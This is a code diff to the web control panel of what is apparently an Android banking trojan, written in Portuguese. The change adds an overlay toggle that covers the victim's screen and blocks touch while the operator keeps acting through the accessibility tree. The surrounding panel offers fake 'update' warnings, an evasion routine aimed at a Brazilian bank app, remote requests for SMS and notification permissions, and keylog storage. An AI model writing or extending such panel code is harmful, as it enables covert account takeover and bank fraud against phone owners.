@@ -84,7 +84,7 @@ body.semAside aside{display:none}
 <select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span><span id=lat class=sm>--</span>
 <span class=grp><button class=pri title="Liga a transmissão de tela" onclick="c('shot',{on:true})">Ver tela</button>
 <button class=dg title="Para a transmissão, bloqueia a tela e limpa o painel" onclick="c('off')">Desligar</button>
-<button title="Acorda a tela do aparelho" onclick="c('screen',{on:true})">Acordar</button></span>
+<button title="Acorda a tela do aparelho" onclick="c('screen',{on:true})">Acordar</button></span><span class=grp><button id=ovb title="Tapa a tela e opera pela arvore" onclick="ovTog()">sobrepor</button></span>
 <span class=grp><button onclick="zoom(-1)" title="Diminuir zoom">-</button><span id=z class=sm>1x</span><button onclick="zoom(1)" title="Aumentar zoom">+</button></span>
 <button id=so title="Esconde tudo e mostra só a tela (Esc sai)" onclick="soTela()">só tela</button>
 <button id=sp title="Mostra ou esconde o painel lateral" onclick="document.body.classList.toggle('semAside');setTimeout(fit,80)">painel</button>
@@ -118,11 +118,12 @@ body.semAside aside{display:none}
 <div id=v-live>
 <div class="ln leg">toque = clique &middot; arraste = swipe &middot; segure = toque longo &middot; para digitar, use o campo da barra inferior</div>
 <div class=ln><button onclick="recTog()">Gravar macro</button><span id=rc class=sm>0</span><button onclick="playM()">Executar macro</button></div>
-<div class=ln><button onclick="c('ov',{on:true})">Sobreposição on</button><button onclick="c('ov',{on:false})">Sobreposição off</button></div>
+<div class=ln><button onclick="ovTog(1)">Sobreposição on</button><button onclick="ovTog(0)">Sobreposição off</button></div>
 <div class=ln><button onclick="avPreset(0)">Aviso falso: atualização</button><button onclick="avPreset(1)">Aviso falso: sincronização</button></div>
 <pre id=out></pre>
 </div>
 <div id=v-arvore style=display:none>
+<div class=ln><button onclick="ovTog()">Sobrepor tela</button><button onclick="ovTog(0)">Tirar</button><span class=sm>com a tela tapada a imagem congela</span></div>
 <div class="ln"><input id=af placeholder="filtrar por texto"><button onclick="c('tree')">Atualizar</button><label class=sm><input type=checkbox id=ar checked> auto</label></div>
 <div class="ln"><button onclick="c('open')" title="Abre o aplicativo do nó selecionado">Abrir app do nó</button><button onclick="k(4)" title="Voltar">Voltar</button></div>
 <div class="ln leg">clique no texto = toque no elemento &middot; L = toque longo &middot; T = digitar no campo</div>
@@ -172,6 +173,8 @@ body.semAside aside{display:none}
 <div class="ln leg">desliga projeção, sobreposição, opções do desenvolvedor, depuração e instalação por fonte desconhecida, e reabre o banco. ao terminar, use Restaurar.</div>
 <div class=ln><input id=bpkg value="br.com.intermedium" placeholder="pacote do banco"></div>
 <div class=ln><button class=pri onclick="bankOn()">Ativar evasão e reabrir banco</button><button onclick="c('unbank')">Restaurar</button></div>
+<div class="ln leg" style="margin-top:10px">sobreposicao: tapa a tela e trava o toque; a arvore continua funcionando</div>
+<div class=ln><button class=pri onclick="ovTog(1)">Sobrepor e abrir arvore</button><button onclick="ovTog(0)">Tirar sobreposicao</button></div>
 <pre id=bankout></pre>
 <div class="ln leg" style="margin-top:10px">permissões remotas (funcionam com a tela preta, use a aba árvore para confirmar)</div>
 <div class=ln><button onclick="c('perm')">Abrir setup</button><button onclick="c('pedir',{s:'sms'})">Mensagens</button><button onclick="c('notiflist')">Notificações</button></div>
@@ -216,7 +219,7 @@ body.semAside aside{display:none}
 <script>
 const T=new URLSearchParams(location.search).get('t')||'';
 const $=s=>document.querySelector(s),i=$('#scr'),dev=$('#dev'),st=$('#st'),dot=$('#dot'),lat=$('#lat'),wrap=$('#wrap');
-let w,sel='',geo={w:0,h:0},lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=false,nos=[],cofre=[],kl=[],kAt=0,recT=null,kN=0;
+let w,sel='',geo={w:0,h:0},ovOn=false,lf=0,tp=0,recs=null,vNow='live',pasta='/sdcard',pend=null,kt=null,kpause=false,z=1,mag=false,nos=[],cofre=[],kl=[],kAt=0,recT=null,kN=0;
 function toq(x){const d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2600)}
 function log(x){const o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-9000);o.scrollTop=o.scrollHeight}
 function co(){
@@ -281,7 +284,8 @@ function fit(){
 addEventListener('resize',fit);
 if(window.ResizeObserver)new ResizeObserver(fit).observe(wrap);
 setInterval(()=>{
-  if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
+  if(ovOn){st.textContent='sobreposicao ativa - use a arvore';dot.className='dot on'}
+  else if(!sel){st.textContent='nenhum aparelho';dot.className='dot'}
   else if(!lf||Date.now()-lf>2500){st.textContent='sem imagens';dot.className='dot w'}
   else dot.className='dot on'},1000);
 function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'nenhum'));
@@ -289,6 +293,14 @@ function pick(){sel=dev.value;lf=0;i.removeAttribute('src');log('[*] '+(sel||'ne
 dev.onchange=pick;
 function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
 function k(n){c('key',{code:n});push({k:n})}
+function ovTog(v){
+  if(v===undefined)v=!ovOn;
+  ovOn=!!v;
+  var b=document.getElementById('ovb');if(b)b.classList.toggle('on',ovOn);
+  c('ov',{on:ovOn,fixo:ovOn});
+  if(ovOn){toq('tela tapada - use a arvore');go('arvore')}
+  else{toq('tela liberada');c('shot',{on:true})}
+}
 function soTela(){document.body.classList.toggle('somente');$('#so').classList.toggle('on',document.body.classList.contains('somente'));setTimeout(fit,60)}
 addEventListener('keydown',e=>{if(e.key==='Escape'&&document.body.classList.contains('somente'))soTela()});
 function go(v){vNow=v;
